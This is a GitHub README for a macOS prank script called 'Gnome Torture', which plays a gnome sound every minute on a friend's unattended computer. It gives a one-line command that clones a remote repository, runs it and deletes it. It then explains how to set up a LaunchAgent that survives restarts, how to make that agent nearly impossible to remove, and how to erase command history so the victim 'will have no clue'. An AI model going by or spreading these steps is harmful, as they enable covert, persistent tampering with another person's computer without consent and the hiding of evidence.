TL;DR: type this line into the application **Terminal**: `git clone https://github.com/AddisonGoolsbee/gnome-torture && gnome-torture/run && rm -rf gnome-torture`

# Gnome Torture

Set a permanent gnome sound to play every minute or so on a computer forever. The perfect troll when a friend leaves their computer open.

This script will continue even if the user closes all applications and restarts their computer. Depending on how nefarious you want to be, you can make it practically impossible to remove

_This script only works for Apple computers_

## Usage

1. Type `run` in the command line
2. Remove this folder so you leave no trace :smiling_imp:

## Stopping the Script

- If you can find and delete the `gnome.mp3` file, that will be enough to stop the sound
- If the daemon file still exists, you can run `launchctl unload ~/Library/LaunchAgents/com.gnome.plist`

## Making it Harder to Stop the Script

- Rename `gnome.mp3` and move it to a different location. This should be done by modifying the variable `SOUND_LOCATION` in the `run` script, and then running the script again. Make sure that the location is within the user's home directory, otherwise you will not have permissions to copy it to that location
- Delete the file `~/Library/LaunchAgents/com.gnome.plist`. The script will keep running, but it will become nearly impossible to stop since the code doesn't exist in a file anymore.
- Delete the last few lines of command line history, so the user will have no clue what you did
